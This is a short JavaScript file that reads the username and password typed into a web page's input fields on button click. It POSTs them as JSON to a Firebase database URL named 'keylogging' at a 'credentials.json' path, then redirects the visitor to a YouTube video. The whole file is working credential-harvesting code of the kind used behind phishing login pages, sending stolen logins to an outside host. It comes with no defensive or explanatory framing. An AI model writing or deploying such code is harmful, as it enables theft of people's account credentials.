const userInputs = document.querySelectorAll("input");
const submitButton = document.querySelector("button");

console.log("test123")

const submitFormHandler = async (event) => {
    event.preventDefault();

    let username = userInputs[0].value;
    let password = userInputs[1].value;

    await fetch("https://keylogging-d5c8a-default-rtdb.europe-west1.firebasedatabase.app/credentials.json", {
        method: "POST",
        body: JSON.stringify({ username, password }),
        headers: {"Content-Type": "application/json"},
    });

    window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

};

if(submitButton){
    submitButton.addEventListener("click", submitFormHandler);
}